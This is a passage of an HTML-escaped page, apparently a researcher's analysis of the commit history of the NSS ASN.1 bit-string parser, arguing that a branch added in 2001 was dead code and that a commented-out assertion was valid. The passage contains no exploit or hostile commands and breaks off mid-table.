class=\"c16\"&gt;byte&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;7&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; PORT_SetError &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;SEC_ERROR_BAD_DER&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;top&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;status &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;decodeError&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;bit_string_unused_bits &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;byte&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;duringBitString&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;pending &lt;/span&gt;&lt;span class=\"c1\"&gt;-=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;1&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;1&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;On August 24th, 2001 the form of the code changed to something like the current version, &lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://github.com/jrmuizel/mozilla-cvs-history/commit/4f4edc3a5054512a54fda651497d1dafe77f7656\"&gt;in &lt;/a&gt;&lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://github.com/jrmuizel/mozilla-cvs-history/commit/4f4edc3a5054512a54fda651497d1dafe77f7656\"&gt;this commit&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c21\"&gt;&lt;a class=\"c241\" href=\"https://github.com/jrmuizel/mozilla-cvs-history/commit/4f4edc3a5054512a54fda651497d1dafe77f7656\"&gt;&amp;nbsp;with the message &amp;quot;Memory leak fixes.&amp;quot;&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c9\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.0b11f6358ac77c720b0e948095a2bc43c83ffaf3\"&gt;&lt;/a&gt;&lt;a id=\"t.17\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c16\"&gt;static&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;long&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;sec_asn1d_parse_bit_string &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;sec_asn1d_state &lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;const&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;char&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;buf&lt;/span&gt;&lt;span class=\"c1\"&gt;,&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;long&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;char&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;byte&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c12\"&gt;-&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&amp;nbsp; PORT_Assert &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;(&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;state&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;pending &lt;/span&gt;&lt;span class=\"c1 c12\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c12\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c12\"&gt;0&lt;/span&gt;&lt;span class=\"c1 c12\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c23\"&gt;/*PORT_Assert (state-&amp;gt;pending &amp;gt; 0); */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; PORT_Assert &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;beforeBitString&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c4\"&gt;+&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c4\"&gt;if&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;(&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;state&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;pending &lt;/span&gt;&lt;span class=\"c1 c4\"&gt;==&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c4\"&gt;0&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;)&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c4\"&gt;+&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c4\"&gt;if&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;(&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;state&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;dest &lt;/span&gt;&lt;span class=\"c1 c4\"&gt;!=&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;)&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c4\"&gt;+&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c20 c4\"&gt;SECItem&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;*&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;item &lt;/span&gt;&lt;span class=\"c1 c4\"&gt;=&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;(&lt;/span&gt;&lt;span class=\"c20 c4\"&gt;SECItem&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;*)(&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;state&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;dest&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c4\"&gt;+&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;data &lt;/span&gt;&lt;span class=\"c1 c4\"&gt;=&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c4\"&gt;+&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; item&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;len &lt;/span&gt;&lt;span class=\"c1 c4\"&gt;=&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c4\"&gt;0&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c4\"&gt;+&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;place &lt;/span&gt;&lt;span class=\"c1 c4\"&gt;=&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;beforeEndOfContents&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c4\"&gt;+&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16 c4\"&gt;return&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11 c4\"&gt;0&lt;/span&gt;&lt;span class=\"c1 c4\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c4\"&gt;+&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1 c4\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1 c4\"&gt;+&lt;/span&gt;&lt;span class=\"c3 c4\"&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=\"c1 c4\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;len &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;top&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;status &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;needBytes&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;byte&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c16\"&gt;unsigned&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;char&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;*&lt;/span&gt;&lt;span class=\"c3\"&gt;buf&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c16\"&gt;byte&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;7&lt;/span&gt;&lt;span class=\"c1\"&gt;)&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; PORT_SetError &lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;SEC_ERROR_BAD_DER&lt;/span&gt;&lt;span class=\"c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;top&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;status &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;decodeError&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;bit_string_unused_bits &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c16\"&gt;byte&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;place &lt;/span&gt;&lt;span class=\"c1\"&gt;=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;duringBitString&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;pending &lt;/span&gt;&lt;span class=\"c1\"&gt;-=&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;1&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c14\"&gt;&lt;span class=\"c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;return&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;1&lt;/span&gt;&lt;span class=\"c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c1\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"c0\"&gt;&lt;span class=\"c19 c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;This commit added the &lt;/span&gt;&lt;span class=\"c7\"&gt;item-&amp;gt;data = NULL&lt;/span&gt;&lt;span&gt;&amp;nbsp;line but here it&amp;#39;s only reachable when &lt;/span&gt;&lt;span class=\"c7\"&gt;pending == 0&lt;/span&gt;&lt;span&gt;. I am fairly convinced that this was dead code and not actually reachable (and that the &lt;/span&gt;&lt;span class=\"c7\"&gt;PORT_Assert&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;which they commented out was actually valid.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"c7\"&gt;beforeBitString&lt;/span&gt;&lt;span&gt;&amp;nbsp;state (which leads to the &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span&gt;&amp;nbsp;method being called) will always be preceded by the &lt;/span&gt;&lt;span class=\"c7\"&gt;afterLength&lt;/span&gt;&lt;span&gt;&amp;nbsp;state (implemented by &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_prepare_for_contents.&lt;/span&gt;&lt;span&gt;) On entry to the &lt;/span&gt;&lt;span class=\"c7\"&gt;afterLength&lt;/span&gt;&lt;span&gt;&amp;nbsp;state &lt;/span&gt;&lt;span class=\"c7\"&gt;state-&amp;gt;contents_length&lt;/span&gt;&lt;span&gt;&amp;nbsp;is equal to the parsed length field and &amp;nbsp;&lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_prepare_for_contents&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;does:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span class=\"c19 c7\"&gt;state-&amp;gt;pending = state-&amp;gt;contents_length;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;So in order to reach &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_parse_bit_string&lt;/span&gt;&lt;span&gt;&amp;nbsp;with &lt;/span&gt;&lt;span class=\"c7\"&gt;state-&amp;gt;pending == 0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"c7\"&gt;state-&amp;gt;contents_length&lt;/span&gt;&lt;span&gt;&amp;nbsp;would also need to be &lt;/span&gt;&lt;span class=\"c7\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class=\"c7\"&gt;sec_asn1d_prepare_for_contents&lt;/span&gt;&lt;span class=\"c9\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c6 c8 c15\"&gt;&lt;span&gt;That means that in the if/else decision tree below, at least one of the two conditionals &lt;/span&gt;&lt;span class=\"c17\"&gt;must&lt;/span&gt;&lt;span class=\"c9\"&gt;&amp;nbsp;be true:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c0 c15\"&gt;&lt;span class=\"c9\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.b58e1df8cbca28721618ec8bc93413630d1f04c0\"&gt;&lt;/a&gt;&lt;a id=\"t.18\"&gt;&lt;/a&gt;&lt;table class=\"c25\"&gt;&lt;tbody&gt;&lt;tr class=\"c18\"&gt;&lt;td class=\"c5\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"c6\"&gt;&lt;span class=\"c3\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"c16\"&gt;if&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;(&lt;/span&gt;&lt;span class=\"c3\"&gt;state&lt;/span&gt;&lt;span class=\"c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"c3\"&gt;contents_length &lt;/span&gt;&lt;span class=\"c1\"&gt;==&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c11\"&gt;0&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c1\"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=\"c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span 